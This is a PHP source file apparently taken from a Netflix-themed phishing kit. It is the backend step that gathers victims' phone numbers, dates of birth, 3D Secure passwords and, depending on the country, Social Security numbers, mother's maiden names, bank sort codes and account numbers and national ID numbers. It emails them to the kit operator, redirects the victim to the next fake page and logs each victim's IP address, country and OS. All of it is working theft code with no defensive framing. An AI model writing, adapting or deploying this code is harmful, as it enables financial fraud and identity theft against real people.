<?php
session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../../RGN/functions/Email.php');
include('../../../RGN/functions/get_browser.php');
include('../../../RGN/functions/dete.php');
$Z118_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>ACCOUNT Νеtflіx</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VBV INFO INFORMATION</font> ]±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [phone]  = <font style='color:#0070ba;'>+".$_SESSION['_phone_']."-".$_SESSION['_phone_numb_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Date Of Birth]  = <font style='color:#0070ba;'>".$_SESSION['_dob_']."</font><br>
<font style='color:#9c0000;'>✪</font> [3D Secure]      = <font style='color:#0070ba;'>".$_SESSION['_password_vbv_']."</font><br>\n";

if ($countrycode=="US"){ // UNITED STATES
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Social Security Number] = <font style='color:#0070ba;'>".$_SESSION['_ssnnum_']."</font><br>\n";
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Phone Number] = <font style='color:#0070ba;'>+".$_SESSION['_phone_']."-".$_SESSION['_phone_numb_']."</font><br>\n";}
elseif ($countrycode=="CA"){ // CANADA
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Social Security Number] = <font style='color:#0070ba;'>".$_SESSION['_ssnnum_']."</font><br>\n";
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Mother's Maiden Name] = <font style='color:#0070ba;'>".$_SESSION['_mmname_']."</font><br>\n";
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Phone Number] = <font style='color:#0070ba;'>+".$_SESSION['_phone_']."-".$_SESSION['_phone_numb_']."</font><br>\n";}
elseif ($countrycode=="GB" or $countrycode== "IE"){ // UNITED KINGDOM // IRELAND
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Sort Code] = <font style='color:#0070ba;'>".$_SESSION['_sortnum_']."</font><br>\n";
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Account Number] = <font style='color:#0070ba;'>".$_SESSION['_accnumber_']."</font><br>\n";}
elseif($countrycode=="AU"){ // AUSTRALIA
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Credit Limits] = <font style='color:#0070ba;'>".$_SESSION['_creditlimit_']."</font><br>\n";
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [OSID]	= <font style='color:#0070ba;'>".$_SESSION['_osid_']."</font><br>\n";}
elseif($countrycode=="IT"){ // ITALY
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Codice Fiscale] = <font style='color:#0070ba;'>".$_SESSION['_codicefiscale_']."</font><br>\n";}
if($countrycode=="CH" or $countrycode=="DE") { // SWITZERLAND || GERMANY
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Kontonummer] = <font style='color:#0070ba;'>".$_SESSION['_kontonummer_']."</font><br>\n";}
elseif($countrycode=="GR"){ // GREECE
$Z118_MESSAGE .= "<font style='color:#9c0000;'>✪</font> [Officiel ID] = <font style='color:#0070ba;'>".$_SESSION['_offid_']."</font><br>\n";}
$Z118_MESSAGE .= "
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
################## <font style='color: #820000;'>BY DWM+18</font> #####################
</div></html>\n";

    $Z118_SUBJECT = "".$_SESSION['_login_email_']." ✪ ".$_SESSION['_ip_']." ✪";
    $Z118_HEADERS .= "From:DWM+18_Nt+VBV <noreply@vssv.com>";
    $Z118_HEADERS .= $_POST['eMailAdd']."\n";
    $Z118_HEADERS .= "MIME-Version: 1.0\n";
	$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
	
        @mail($RouGani, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
        HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);

		
		
	////////////////////////////////////////////////// RouGani //////////////////////////////////////////////

		
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
function getOS() { 
    global $user_agent;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

date_default_timezone_set('Africa/Tunis');
$TIME = date("d-m-Y H:i:s"); 
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ;
$ip = getenv("REMOTE_ADDR");
$OS =getOS($_SERVER['HTTP_USER_AGENT']);
$file = fopen("../../../logs.txt","a");
fwrite($file,"".$TIME." - ".$COUNTRY." - ".$OS." - ".$ip."                => VBV DONE ! \n")  ;	
		
		?>